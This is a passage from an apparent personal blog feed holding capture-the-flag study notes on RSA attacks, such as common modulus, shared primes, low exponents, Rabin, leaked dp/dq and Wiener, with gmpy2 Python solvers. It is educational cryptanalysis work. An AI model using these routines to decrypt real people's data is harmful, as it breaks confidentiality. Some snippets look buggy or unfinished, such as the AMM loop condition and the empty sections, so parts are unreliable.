<span class="number">653</span>, <span class="number">659</span>, <span class="number">661</span>, <span class="number">673</span>, <span class="number">677</span>, <span class="number">683</span>, <span class="number">691</span>, <span class="number">701</span>, <span class="number">709</span>, <span class="number">719</span>, <span class="number">727</span>, <span class="number">733</span>, <span class="number">739</span>, <span class="number">743</span>,</span><br><span class="line">              <span class="number">751</span>, <span class="number">757</span>, <span class="number">761</span>, <span class="number">769</span>, <span class="number">773</span>, <span class="number">787</span>, <span class="number">797</span>, <span class="number">809</span>, <span class="number">811</span>, <span class="number">821</span>, <span class="number">823</span>, <span class="number">827</span>, <span class="number">829</span>, <span class="number">839</span>, <span class="number">853</span>, <span class="number">857</span>, <span class="number">859</span>, <span class="number">863</span>, <span class="number">877</span>, <span class="number">881</span>, <span class="number">883</span>,</span><br><span class="line">              <span class="number">887</span>, <span class="number">907</span>, <span class="number">911</span>, <span class="number">919</span>, <span class="number">929</span>, <span class="number">937</span>, <span class="number">941</span>, <span class="number">947</span>, <span class="number">953</span>, <span class="number">967</span>, <span class="number">971</span>, <span class="number">977</span>, <span class="number">983</span>, <span class="number">991</span>, <span class="number">997</span>, <span class="number">1009</span>, <span class="number">1013</span>, <span class="number">1019</span>, <span class="number">1021</span>, <span class="number">1031</span>,</span><br><span class="line">              <span class="number">1033</span>, <span class="number">1039</span>, <span class="number">1049</span>, <span class="number">1051</span>, <span class="number">1061</span>, <span class="number">1063</span>, <span class="number">1069</span>, <span class="number">1087</span>, <span class="number">1091</span>, <span class="number">1093</span>, <span class="number">1097</span>, <span class="number">1103</span>, <span class="number">1109</span>, <span class="number">1117</span>, <span class="number">1123</span>, <span class="number">1129</span>, <span class="number">1151</span>,</span><br><span class="line">              <span class="number">1153</span>, <span class="number">1163</span>, <span class="number">1171</span>, <span class="number">1181</span>, <span class="number">1187</span>, <span class="number">1193</span>, <span class="number">1201</span>, <span class="number">1213</span>, <span class="number">1217</span>, <span class="number">1223</span>, <span class="number">1229</span>, <span class="number">1231</span>, <span class="number">1237</span>, <span class="number">1249</span>, <span class="number">1259</span>, <span class="number">1277</span>, <span class="number">1279</span>,</span><br><span class="line">              <span class="number">1283</span>, <span class="number">1289</span>, <span class="number">1291</span>, <span class="number">1297</span>, <span class="number">1301</span>, <span class="number">1303</span>, <span class="number">1307</span>, <span class="number">1319</span>, <span class="number">1321</span>, <span class="number">1327</span>, <span class="number">1361</span>, <span class="number">1367</span>, <span class="number">1373</span>, <span class="number">1381</span>, <span class="number">1399</span>, <span class="number">1409</span>, <span class="number">1423</span>,</span><br><span class="line">              <span class="number">1427</span>, <span class="number">1429</span>, <span class="number">1433</span>, <span class="number">1439</span>, <span class="number">1447</span>, <span class="number">1451</span>, <span class="number">1453</span>, <span class="number">1459</span>, <span class="number">1471</span>, <span class="number">1481</span>, <span class="number">1483</span>, <span class="number">1487</span>, <span class="number">1489</span>, <span class="number">1493</span>, <span class="number">1499</span>, <span class="number">1511</span>, <span class="number">1523</span>,</span><br><span class="line">              <span class="number">1531</span>, <span class="number">1543</span>, <span class="number">1549</span>, <span class="number">1553</span>, <span class="number">1559</span>, <span class="number">1567</span>, <span class="number">1571</span>, <span class="number">1579</span>, <span class="number">1583</span>, <span class="number">1597</span>, <span class="number">1601</span>, <span class="number">1607</span>, <span class="number">1609</span>, <span class="number">1613</span>, <span class="number">1619</span>, <span class="number">1621</span>, <span class="number">1627</span>,</span><br><span class="line">              <span class="number">1637</span>, <span class="number">1657</span>, <span class="number">1663</span>, <span class="number">1667</span>, <span class="number">1669</span>, <span class="number">1693</span>, <span class="number">1697</span>, <span class="number">1699</span>, <span class="number">1709</span>, <span class="number">1721</span>, <span class="number">1723</span>, <span class="number">1733</span>, <span class="number">1741</span>, <span class="number">1747</span>, <span class="number">1753</span>, <span class="number">1759</span>, <span class="number">1777</span>,</span><br><span class="line">              <span class="number">1783</span>, <span class="number">1787</span>, <span class="number">1789</span>, <span class="number">1801</span>, <span class="number">1811</span>, <span class="number">1823</span>, <span class="number">1831</span>, <span class="number">1847</span>, <span class="number">1861</span>, <span class="number">1867</span>, <span class="number">1871</span>, <span class="number">1873</span>, <span class="number">1877</span>, <span class="number">1879</span>, <span class="number">1889</span>, <span class="number">1901</span>, <span class="number">1907</span>,</span><br><span class="line">              <span class="number">1913</span>, <span class="number">1931</span>, <span class="number">1933</span>, <span class="number">1949</span>, <span class="number">1951</span>, <span class="number">1973</span>, <span class="number">1979</span>, <span class="number">1987</span>, <span class="number">1993</span>, <span class="number">1997</span>, <span class="number">1999</span>, <span class="number">2003</span>, <span class="number">2011</span>, <span class="number">2017</span>, <span class="number">2027</span>, <span class="number">2029</span>, <span class="number">2039</span>,</span><br><span class="line">              <span class="number">2053</span>, <span class="number">2063</span>, <span class="number">2069</span>, <span class="number">2081</span>, <span class="number">2083</span>, <span class="number">2087</span>, <span class="number">2089</span>, <span class="number">2099</span>, <span class="number">2111</span>, <span class="number">2113</span>, <span class="number">2129</span>, <span class="number">2131</span>, <span class="number">2137</span>, <span class="number">2141</span>, <span class="number">2143</span>, <span class="number">2153</span>, <span class="number">2161</span>,</span><br><span class="line">              <span class="number">2179</span>, <span class="number">2203</span>, <span class="number">2207</span>, <span class="number">2213</span>, <span class="number">2221</span>, <span class="number">2237</span>, <span class="number">2239</span>, <span class="number">2243</span>, <span class="number">2251</span>, <span class="number">2267</span>, <span class="number">2269</span>, <span class="number">2273</span>, <span class="number">2281</span>, <span class="number">2287</span>, <span class="number">2293</span>, <span class="number">2297</span>, <span class="number">2309</span>,</span><br><span class="line">              <span class="number">2311</span>, <span class="number">2333</span>, <span class="number">2339</span>, <span class="number">2341</span>, <span class="number">2347</span>, <span class="number">2351</span>, <span class="number">2357</span>, <span class="number">2371</span>, <span class="number">2377</span>, <span class="number">2381</span>, <span class="number">2383</span>, <span class="number">2389</span>, <span class="number">2393</span>, <span class="number">2399</span>, <span class="number">2411</span>, <span class="number">2417</span>, <span class="number">2423</span>,</span><br><span class="line">              <span class="number">2437</span>, <span class="number">2441</span>, <span class="number">2447</span>, <span class="number">2459</span>, <span class="number">2467</span>, <span class="number">2473</span>, <span class="number">2477</span>, <span class="number">2503</span>, <span class="number">2521</span>, <span class="number">2531</span>, <span class="number">2539</span>, <span class="number">2543</span>, <span class="number">2549</span>, <span class="number">2551</span>, <span class="number">2557</span>, <span class="number">2579</span>, <span class="number">2591</span>,</span><br><span class="line">              <span class="number">2593</span>, <span class="number">2609</span>, <span class="number">2617</span>, <span class="number">2621</span>, <span class="number">2633</span>, <span class="number">2647</span>, <span class="number">2657</span>, <span class="number">2659</span>, <span class="number">2663</span>, <span class="number">2671</span>, <span class="number">2677</span>, <span class="number">2683</span>, <span class="number">2687</span>, <span class="number">2689</span>, <span class="number">2693</span>, <span class="number">2699</span>, <span class="number">2707</span>,</span><br><span class="line">              <span class="number">2711</span>, <span class="number">2713</span>, <span class="number">2719</span>, <span class="number">2729</span>, <span class="number">2731</span>, <span class="number">2741</span>, <span class="number">2749</span>, <span class="number">2753</span>, <span class="number">2767</span>, <span class="number">2777</span>, <span class="number">2789</span>, <span class="number">2791</span>, <span class="number">2797</span>, <span class="number">2801</span>, <span class="number">2803</span>, <span class="number">2819</span>, <span class="number">2833</span>,</span><br><span class="line">              <span class="number">2837</span>, <span class="number">2843</span>, <span class="number">2851</span>, <span class="number">2857</span>, <span class="number">2861</span>, <span class="number">2879</span>, <span class="number">2887</span>, <span class="number">2897</span>, <span class="number">2903</span>, <span class="number">2909</span>, <span class="number">2917</span>, <span class="number">2927</span>, <span class="number">2939</span>, <span class="number">2953</span>, <span class="number">2957</span>, <span class="number">2963</span>, <span class="number">2969</span>,</span><br><span class="line">              <span class="number">2971</span>, <span class="number">2999</span>]</span><br><span class="line">    <span class="comment"># print(primes)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, val):</span><br><span class="line">        M = M * primes[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            p = gmpy2.mpz(k * M + (<span class="built_in">pow</span>(<span class="number">65537</span>, a, M)))</span><br><span class="line">            <span class="keyword">if</span> gmpy2.is_prime(p):</span><br><span class="line">                q = gmpy2.mpz(n // p)</span><br><span class="line">                <span class="keyword">if</span> gmpy2.is_prime(q):</span><br><span class="line">                    <span class="keyword">return</span> p, q</span><br><span class="line">                    <span class="comment"># print(q)</span></span><br></pre></td></tr></table></figure>
<h3 id="xor-factorization">xor factorization</h3>
<blockquote>
<p><a href="https://github.com/sliedes/xor_factor">GitHub - sliedes/xor_factor: Given p xor q and n=p*q for two unknown primes p and q, factor n and output p and q.</a></p>
</blockquote>
<p><strong>usage</strong></p>
<p><code>xor_factor.py n x</code></p>
<h3 id="pollard’s-p-1">pollard’s p-1</h3>
<blockquote>
<p>This part only give the solution.</p>
<p>Detailed introduction needs time to be written.</p>
</blockquote>
<p>$$<br>
(p-1) | B!\<br>
$$</p>
<p>$$<br>
2^{B!}\equiv 1 \mod p<br>
$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> pollard_pm1</span><br><span class="line">p = pollard_pm1(n)</span><br><span class="line"><span class="comment"># May it cost a lot of time, just wait. </span></span><br></pre></td></tr></table></figure>
<h3 id="williams’s-p-1">williams’s p+1</h3>
<blockquote>
<p>As above.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> williams_pp1</span><br><span class="line">p = williams_pp1(n)</span><br><span class="line"><span class="comment"># Similar to Pollard&#x27;s p-1</span></span><br></pre></td></tr></table></figure>
<h2 id="Others">Others</h2>
<ul>
<li>lenstra elliptic curve factorization</li>
<li>birthday attack</li>
<li>……</li>
</ul>
<h1>SAME MOD</h1>
<p>The attack is based on the <strong>Homomorphic Encryption</strong> and <strong>Extended Euclidean Algorithm</strong>.</p>
<blockquote>
<p>Usually, we have two pairs of $c$ and $e$ and both them have the same modulo.</p>
<p>*REMEMBER that the encrypted m should be same. *</p>
</blockquote>
<p>$$<br>
c_{1} \equiv m^{e_{1}} \mod n\<br>
$$</p>
<p>$$<br>
c_{2} \equiv m^{e_{2}} \mod n<br>
$$</p>
<p>Use Extended Euclidean Algorithm, the eqution follows:<br>
$$<br>
r \times e_{1} + s \times e_{2} = gcd(e1, e2)<br>
$$<br>
Based on the <code>Multiplicative homomorphism</code>, and we can make a conversion.</p>
<p>$$<br>
c_{1}^{s} \times c_{2}^{r} \equiv m^{r\times e_{1} + s\times e_{2}} \mod n<br>
$$</p>
<h2 id="e-1-e-2-are-primes">$e_{1}$, $e_{2}$ are primes</h2>
<p>If $e_{1}$ and $e_{2}$ are primes, $gcd(e_{1}, e_{2}) = 1$, and we can substitute the integer into the equation above.<br>
$$<br>
c_{1}^{s} \times c_{2}^{r} \equiv m \mod n<br>
$$</p>
<h2 id="e-1-e-2-not-primes">$e_{1}$, $e_{2}$ not primes</h2>
<ol>
<li>$gcd(e1, e2)$ and $\varphi(n)$ are not relatively-prime.</li>
</ol>
<p>May use <code>Rabin Algorithm</code> to solve this problem. For another word, the problem converts to the <code>Low_Exponent_e2</code> problem.</p>
<ol start="2">
<li>$gcd(e1, e2)$ and $\varphi(n)$ are relatively-prime.</li>
</ol>
<p>Thus,  just use <code>iroot(m, g)</code> and we get the true $m$. <strong>REMEMBER</strong> that before the calculation we ought to <code> % n</code> first.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Same_Mod_RSA</span>(<span class="params">e1, e2, c1, c2, n</span>):</span><br><span class="line">    g, r, s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">        r = -r</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s &lt; <span class="number">0</span>:</span><br><span class="line">        s = -s</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = gmpy2.powmod(c1, r, n)*gmpy2.powmod(c2, s, n) % n <span class="comment"># keypoint</span></span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gmpy2.iroot(m, g)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p><em>The code ignores that gcd($e_{1}$, $e_{2}$) and $\varphi(n)$ are not relatively-prime</em>.</p>
<h2 id="Multiplicative-congruence">Multiplicative congruence</h2>
<p>We use multiplicative congruence to simplify our calculation.</p>
<p>It usually gives us one same modulo $n$ and two more pairs of $c$, $e$.</p>
<p><strong>FOR EXAMPLE</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N = </span><br><span class="line">c1 = </span><br><span class="line">e1 = </span><br><span class="line">c2 = </span><br><span class="line">e2 = </span><br><span class="line">c3 = </span><br><span class="line">e3 = </span><br></pre></td></tr></table></figure>
<p>The deduction is as follows:<br>
$$<br>
g_{1} \equiv e_{1} \cdot r_{1} + e_{2} \cdot s_{1} \<br>
$$<br>
$$<br>
g_{2} \equiv g_{1} \cdot r_{2} + e_{3} \cdot s_{2}<br>
$$</p>
<p>The three public keys satisfy $gcd(e_{1}, e_{2}, e_{3}) = 1$, so $g_{2} = 1$.</p>
<p>We can get the equation that $1\equiv (e_{1}\cdot r_{1} + e_{2} \cdot s_{1})\cdot r_{2} + e_{3} \cdot s_{2}$.</p>
<p>Expand it:<br>
$$<br>
1 \equiv (r_2\cdot r_1)\cdot e_1 + (s_1 \cdot r_2)\cdot e_2 + s_2\cdot e_3<br>
$$</p>
<p>$$<br>
c_1 \equiv m^{e_1} \mod n<br>
$$</p>
<p>$$<br>
c_2 \equiv m^{e_2} \mod n \<br>
$$</p>
<p>$$<br>
c_3 \equiv m^{e_3} \mod n \<br>
$$</p>
<p>$$<br>
\Longrightarrow c_1^{r_2\cdot r_1}\cdot c_2^{s_1\cdot r_2} \cdot c_3^{s_2} \equiv m \mod n<br>
$$</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="comment"># print(g2)</span></span><br><span class="line">m = powmod(c1, r2*r1, n)*powmod(c2, s1*r2, n)*powmod(c3, s2, n) % n <span class="comment"># keypoint</span></span><br></pre></td></tr></table></figure>
<h1>MODULO RELATED</h1>
<blockquote>
<p>$n_{1}$ and $n_{2}$ are relatively-primes</p>
<p>When they encrypt the same message $m$，it exists <strong>THE MODULO RELATED ATTACK</strong>.</p>
</blockquote>
<p><strong>Deduction</strong><br>
$$<br>
n_1 = p \times q_1<br>
$$</p>
<p>$$<br>
n_2 = p \times q_2\<br>
$$</p>
<p><em>Ignore the possibility that $1 \times n_1$ and $1 \times n_2$</em><br>
$$<br>
p = gcd(n_1, n_2) \<br>
$$</p>
<p>$$<br>
q_1 = n_1 // p<br>
$$</p>
<p>$$<br>
q_2 = n_2 // p<br>
$$</p>
<p>$ p$ can be calculated with function <code>gcd()</code> , and  use division to solve out the $q_1$ and $q_2$.</p>
<p>The problem converts to the <code>Original_RSA</code>.</p>
<p><strong>Solution</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_NPM</span>(<span class="params">n1,n2,e,c1</span>):</span><br><span class="line">    p = gmpy2.gcd(n1,n2)</span><br><span class="line">    q1 = n1//p  <span class="comment"># keypoint</span></span><br><span class="line">    N = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e,<span class="built_in">int</span>(N))</span><br><span class="line">    m = gmpy2.powmod(c1,d,n1)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<p><em>Remember that $n_1$ and $c_1$ are one-to-one!</em></p>
<h1>LOW EXPONENT</h1>
<h2 id="e-3">e = 3</h2>
<blockquote>
<p>or one-to-one function</p>
</blockquote>
<p>JUST Bruck.</p>
<ol>
<li>$m^e &lt; n$, means that $k = 0$ in code below</li>
<li>$m^e &gt; n$</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Low_Exponent_e3</span>(<span class="params">c,e,n</span>):</span><br><span class="line">    k = <span class="number">0</span> <span class="comment"># one</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>: <span class="comment"># the other</span></span><br><span class="line">        cm = c + n*k</span><br><span class="line">        m, index = gmpy2.iroot(cm, e)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> m</span><br><span class="line">        k += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="e-and-varphi-n-are-not-relatively-prime">$e$ and $\varphi(n)$ are not relatively-prime</h2>
<h3 id="e-2">e = 2</h3>
<blockquote>
<p>Rabin</p>
</blockquote>
<p><strong>PART1</strong> $m_p$ and $m_q$</p>
<p>Split into two scenarios for discussion:</p>
<ol>
<li>$p$ and $q$ are satisfied $p \equiv q \equiv 3 \mod 4$.</li>
</ol>
<p>$$<br>
m_p \equiv c^{\frac{1}{4}(p + 1)} \mod p<br>
$$</p>
<p>$$<br>
m_q \equiv c^{\frac{1}{4}(q + 1)} \mod q<br>
$$</p>
<ol start="2">
<li>$p$ and $q$ are different to 1.</li>
</ol>
<p>$$<br>
m_p \equiv c^{\frac{1}{2}} \mod p<br>
$$</p>
<p>$$<br>
m_q \equiv c^{\frac{1}{2}} \mod q<br>
$$</p>
<p><strong>PART2</strong> Calculated $y_p$ and $y_q$ with Extended Euclidean Algorithm whose function is <code>gmpy2.gcdext()</code>.<br>
$$<br>
y_p \cdot p + y_q \cdot q = 1<br>
$$<br>
<strong>PART3</strong> Solve out four plaintexts.<br>
$$<br>
a \equiv (y_p \cdot p \cdot m_q + y_q \cdot q \cdot m_p) \mod n<br>
$$</p>
<p>$$<br>
b \equiv n - a<br>
$$</p>
<p>$$<br>
c \equiv (y_p \cdot p \cdot m_q - y_q \cdot q \cdot m_p) \mod n<br>
$$</p>
<p>$$<br>
d \equiv n - c<br>
$$</p>
<p>Thus, we will get four different plaintext, and one of them is the true plaintext.</p>
<p>Here is the complete code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Rabin_e2</span>(<span class="params">c,n,p,q</span>):</span><br><span class="line">    mp = gmpy2.powmod(c,(p+<span class="number">1</span>)//<span class="number">4</span>,p)</span><br><span class="line">    mq = gmpy2.powmod(c,(q+<span class="number">1</span>)//<span class="number">4</span>,q)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mp = gmpy2.powmod(c,1/2,p)</span></span><br><span class="line"><span class="string">    mq = gmpy2.powmod(c,1/2,q)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    gcd,yp,yq = gmpy2.gcdext(p,q)</span><br><span class="line"></span><br><span class="line">    m1 = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    m2 = n - m1</span><br><span class="line">    m3 = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    m4 = n - m3</span><br><span class="line">    <span class="keyword">return</span> m1, m2, m3, m4</span><br></pre></td></tr></table></figure>
<h3 id="e-2-2">e != 2</h3>
<p>If $e$ is not equal to 2, we use another way to calculate the final $m$.</p>
<p>For example, $gcd(e, \varphi(n)) = a$. We can divide $e$ to get the equation $gcd(e//a, \varphi(n)) = 1$ to solve the private key $d$.</p>
<p>Finally, we get the $m^{a}$. We use <code>iroot($m^&#123;a&#125;$, a)[0]</code> to get the final plaintext $m$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># We define phi as N</span></span><br><span class="line">a = gcd(e, N)</span><br><span class="line">d = invert(e//a, N)</span><br><span class="line">m = iroot(powmod(c, d, n), a)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<h3 id="AMM">AMM</h3>
<blockquote>
<p>The same $e$ is too large to solve out.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GF</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a,b,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">x,e,p</span>):</span><br><span class="line">    GF(p)</span><br><span class="line">    y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> g(y, (p-<span class="number">1</span>)//e) == <span class="number">1</span>:</span><br><span class="line">        y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</span><br><span class="line">    <span class="comment">#p-1 = e^t*s</span></span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">    s = p // (e**t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e&#x27;</span>, e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;s&#x27;</span>, s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;t&#x27;</span>, t)</span><br><span class="line">    <span class="comment"># s|ralpha-1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (s * k + <span class="number">1</span>) // e</span><br><span class="line">    a = g(y, (e ** (t - <span class="number">1</span>) ) * s)</span><br><span class="line">    b = g(x, e * alpha - <span class="number">1</span>)</span><br><span class="line">    c = g(y, s)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = g(b,e**(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d,a)</span><br><span class="line">        b = b * (g(g(c, e), j))</span><br><span class="line">        h = h * g(c, j)</span><br><span class="line">        c = g(c, e)</span><br><span class="line">    root = (g(x, alpha * h)) % p</span><br><span class="line">    roots = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">        mp2 = root * g(a,i) % p</span><br><span class="line">        roots.add(mp2)</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> m: <span class="comment"># edit</span></span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h1>RSA_LEAKAGE</h1>
<h2 id="Leakage-d">Leakage_d</h2>
<p><strong>Use RSAConverter</strong>.</p>
<ul>
<li>$n$, $d$, hex(), delete <code>0x</code></li>
<li>$e$, hex(), delete <code>x</code></li>
</ul>
<h2 id="Leakage-dp-dq">Leakage_dp&amp;dq</h2>
<p><strong>Dedection and keypoint</strong>!</p>
<p>Prepare and make a definition to $d_p$ and $d_q$.<br>
$$<br>
d_p \equiv d \mod p-1<br>
$$</p>
<p>$$<br>
d_q \equiv d \mod q-1<br>
$$</p>
<p>After deductions, we can get four significant equations or relations.<br>
$$<br>
q \times InvQ \equiv 1 \mod p<br>
$$</p>
<p>$$<br>
m_p \equiv c^{d_p} \mod p<br>
$$</p>
<p>$$<br>
m_q \equiv c^{d_q} \mod q<br>
$$</p>
<p>$$<br>
m \equiv  (((m_p - m_q)\times InvQ)\mod p)\times q + m_q<br>
$$</p>
<p>And make the equations convert to codes. Here is the main function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp_dq</span>(<span class="params">dp, dq, p, q, c</span>):</span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = gmpy2.powmod(c, dp, p)</span><br><span class="line">    mq = gmpy2.powmod(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ)%p)*q + mq</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h2 id="Leakage-dp">Leakage_dp</h2>
<p><strong>Known</strong>:<br>
$$<br>
d_p \equiv d \mod (p-1)<br>
$$</p>
<p>$$<br>
d\times e \equiv 1\mod N \equiv 1 \mod (p-1)(q-1) \tag{1}<br>
$$</p>
<p>Make full use of the two known equations and deduce the key condition to obtain the final $p$ and $q$.<br>
$$<br>
d_p \times e \equiv d \times e \mod (p-1) \equiv de + k_1(p-1) \tag{2}<br>
$$<br>
Substitute  <code>(2)</code> to <code>(1)</code>:<br>
$$<br>
k_1(p-1) + d_p e = 1 + k_2(p-1)(q-1)<br>
$$</p>
<p>$$<br>
d_pe - 1 = (p-1)[k_2(q-1) -k_1]<br>
$$</p>
<p>Assume $k_2(q-1) - k_1$ is $x$, and $x$ is range from 0 and $e$, and we can figure out the $p$ from the equation:<br>
$$<br>
p = \frac{d_{p} e-1}{x} + 1<br>
$$<br>
If we brute the $p$ in range(0, e) and $q = n \div p$ is prime or Integer, we will get the true $p$ and $q$. The code is as follows:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp</span>(<span class="params">n,e,dp,c</span>):</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):  <span class="comment"># start with 1</span></span><br><span class="line">        p = (dp*e - <span class="number">1</span>)//i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            q = n//p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = gmpy2.invert(e, N)</span><br><span class="line">        m = gmpy2.powmod(c, d, n)</span><br><span class="line">        <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h1>LARGE $e$</h1>
<h2 id="Wiener-Attack">Wiener Attack</h2>
<blockquote>
<p>$d &lt; N^{0.25}$</p>
</blockquote>
<h3 id="original-deduction">original deduction</h3>
<p>From the RSA proof, we have a DEFAULT RULE:<br>
$$<br>
e\times d \equiv 1 \mod \varphi(n)<br>
$$<br>
If satisfied conditions, we will get the deduced equation:<br>
$$<br>
e \times d = k \times \varphi(n) + 1 \approx k \times \varphi(n)<br>
$$<br>
In cryptography, the $n$ is usually very large. So, we can make a connection with $\varphi(n)$:<br>
$$<br>
\varphi(n) \approx n<br>
$$<br>
Thus, we can get the final deduction:<br>
$$<br>
e\times d \approx k \times n<br>
$$</p>
<p>$$<br>
\frac{e}{n} \approx \frac{k}{d}<br>
$$</p>
<h3 id="continued-fraction">continued fraction</h3>
<p>Use <strong>Extended Euclidean Algorithm</strong>, and we will get the equation. Here is the proof-picture:</p>
<img src="/2022/11/04/22-11-04-RSA/1.jpg" class="" title="continued_fraction">
<p>For the example, we can get the continued fraction that <code>34/99 -&gt; [0, 2, 1, 10, 3]</code>.</p>
<h3 id="gradual-fraction">gradual fraction</h3>
<h2 id="Boneh-Durfee-Attack">Boneh-Durfee Attack</h2>
<blockquote>
<p>$d&lt; N^{0.29}$</p>
</blockquote>
<h1>COPPPERSMITH</h1>
<h1>Addiction</h1>
<p>When we obtain the $m$, there are different ways to get <code>flag</code>.</p>
<ul>
<li>long_to_bytes()</li>
</ul>
<p>Long integer converts to bytes.</p>
<ul>
<li>ASCII</li>
</ul>
<p>The beginning of $m$ is <code>1</code>, and it may convert to some invisible characters.</p>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Studying</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>factor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-01-qq</title>
